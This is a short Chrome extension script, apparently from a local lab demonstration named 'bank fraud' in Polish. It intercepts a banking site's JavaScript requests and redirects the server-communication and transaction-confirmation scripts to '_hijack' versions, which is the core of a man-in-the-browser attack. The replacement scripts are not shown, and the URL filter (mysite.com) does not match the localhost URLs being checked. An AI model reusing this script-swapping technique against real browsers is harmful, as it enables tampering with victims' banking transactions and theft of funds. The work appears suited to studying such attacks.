chrome.webRequest.onBeforeRequest.addListener(
    function(details) {
        if( details.url == "http://localhost/bank_oszust/JS/serverComm.js" )
            return {redirectUrl: "http://localhost/bank_oszust/JS/serverComm_hijack.js" };
        if( details.url == "http://localhost/bank_oszust/JS/potwierdz.js" )
            return {redirectUrl: "http://localhost/bank_oszust/JS/potwierdz_hijack.js" };
        if( details.url == "http://localhost/bank_oszust/JS/potwierdzenie.js" )
            return {redirectUrl: "http://localhost/bank_oszust/JS/potwierdzenie_hijack.js" };
    },
    {urls: ["*://www.mysite.com/*.js"]},
    ["blocking"]);